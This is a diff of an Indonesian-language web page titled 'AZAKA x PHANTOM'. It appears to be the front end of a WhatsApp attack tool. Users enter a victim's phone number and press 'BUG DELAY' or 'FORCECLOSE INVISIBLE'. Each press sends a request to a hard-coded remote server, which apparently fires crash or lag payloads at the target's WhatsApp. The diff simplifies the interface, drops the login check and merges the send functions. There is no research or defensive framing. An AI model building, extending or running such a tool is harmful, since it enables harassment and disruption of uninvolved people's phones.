@@ -1,119 +1,123 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>AZAKA x PHANTOM</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@900&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
-      font-family: 'Roboto', sans-serif;
+      padding: 0;
       background: url('bg.jpg') no-repeat center center fixed;
       background-size: cover;
+      font-family: sans-serif;
       color: white;
       text-align: center;
     }
+
     .container {
-      backdrop-filter: blur(4px);
-      background-color: rgba(0, 0, 0, 0.6);
-      padding: 2em;
-      min-height: 100vh;
+      margin-top: 80px;
+      padding: 20px;
     }
+
     h1 {
-      color: #ff0000;
-      margin-bottom: 1em;
+      font-size: 32px;
+      color: red;
+      margin-bottom: 30px;
     }
-    input {
-      padding: 0.8em;
+
+    input[type="text"] {
+      padding: 10px;
+      border: none;
+      border-radius: 10px;
       width: 80%;
       max-width: 300px;
-      border-radius: 10px;
-      border: none;
-      margin-bottom: 1em;
+      margin-bottom: 20px;
     }
-    .button {
-      display: block;
-      margin: 1em auto;
-      padding: 0.7em 2em;
-      background-color: #d60032;
+
+    .btn {
+      background-color: crimson;
       color: white;
+      padding: 12px 24px;
+      margin: 10px;
       border: none;
       border-radius: 8px;
       font-weight: bold;
       cursor: pointer;
     }
+
+    .btn:hover {
+      background-color: darkred;
+    }
+
     .status {
-      margin-top: 1em;
+      margin-top: 30px;
       font-weight: bold;
-    }
-    .logo {
-      border-radius: 1em;
-      box-shadow: 0 0 20px red;
-      width: 150px;
-    }
-    .logout-btn {
-  position: fixed; /* Ganti absolute → fixed */
-  top: 10px;
-  left: 10px;
-  z-index: 9999; /* Lebih tinggi agar tidak tertutup */
-  background-color: red;
-  color: white;
-  padding: 5px 12px;
-  font-size: 13px;
-  border: none;
-  border-radius: 6px;
-  cursor: pointer;
+      color: yellow;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="logout">
-      <button onclick="logout()" class="button" style="background-color:#444;">Logout</button>
-    </div>
-    <img src="logo.jpg" alt="Logo" class="logo" />
     <h1>AZAKA x PHANTOM</h1>
-    <input id="target" placeholder="Masukkan nomor target (62xxxx)" />
-    <button class="button" onclick="sendBugDelay()">BUG DELAY</button>
-    <button class="button" onclick="sendForceClose()">FORCECLOSE INVISIBLE</button>
-    <p class="status" id="status">Memuat status...</p>
+
+    <input type="text" id="target" placeholder="Masukkan nomor target (62xxxx)" />
+    <br />
+
+    <button class="btn" onclick="sendAPI('delay')">BUG DELAY</button>
+    <button class="btn" onclick="sendAPI('fcin')">FORCECLOSE INVISIBLE</button>
+
+    <div class="status" id="status">⏳ Mengecek status...</div>
   </div>
 
   <script>
-    if (!localStorage.getItem('login')) {
-      window.location.href = 'login.html';
-    }
+    function sendAPI(type) {
+      const number = document.getElementById("target").value.trim();
 
-    async function loadStatus() {
-      try {
-        const res = await fetch('https://46.101.32.52:2004/status');
-        const status = await res.text();
-        document.getElementById('status').innerHTML = `Status: <span style="color: ${status === 'true' ? 'lime' : 'red'}">${status === 'true' ? 'ON' : 'OFF'}</span>`;
-      } catch (e) {
-        document.getElementById('status').innerHTML = '⚠️ Gagal memuat status';
+      if (!number || !number.startsWith("62") || number.length < 10) {
+        alert("Masukkan nomor yang valid, dimulai dengan 62.");
+        return;
       }
+
+      let url = "";
+      if (type === "delay") {
+        url = `http://46.101.32.52:2004/evolution?type=delay&chatId=${number}@s.whatsapp.net`;
+      } else if (type === "fcin") {
+        url = `http://46.101.32.52:2004/evolution?type=fcin&chatId=${number}@s.whatsapp.net`;
+      }
+
+      console.log("Kirim ke API:", url);
+
+      fetch(url)
+        .then(res => res.text())
+        .then(data => {
+          document.getElementById("status").innerText = `✅ Dikirim: ${data}`;
+        })
+        .catch(err => {
+          console.error("Gagal kirim:", err);
+          document.getElementById("status").innerText = "❌ Gagal mengirim.";
+        });
     }
 
-    function sendBugDelay() {
-      const target = document.getElementById('target').value;
-      if (!target) return alert('Masukkan nomor terlebih dahulu');
-      fetch(`https://46.101.32.52:2004/evolution?type=delay&chatId=${target}@s.whatsapp.net`);
+    function cekStatus() {
+      fetch("http://46.101.32.52:2004/status")
+        .then(res => res.text())
+        .then(data => {
+          const s = document.getElementById("status");
+          if (data.trim() === "true") {
+            s.innerText = "🟢 STATUS: ONLINE";
+            s.style.color = "lightgreen";
+          } else {
+            s.innerText = "🔴 STATUS: OFFLINE";
+            s.style.color = "red";
+          }
+        })
+        .catch(() => {
+          document.getElementById("status").innerText = "⚠️ Tidak bisa cek status";
+        });
     }
 
-    function sendForceClose() {
-      const target = document.getElementById('target').value;
-      if (!target) return alert('Masukkan nomor terlebih dahulu');
-      fetch(`https://46.101.32.52:2004/evolution?type=fcin&chatId=${target}@s.whatsapp.net`);
-    }
-
-    function logout() {
-      localStorage.removeItem('login');
-      window.location.href = 'login.html';
-    }
-
-    loadStatus();
+    cekStatus();
   </script>
 </body>
 </html>
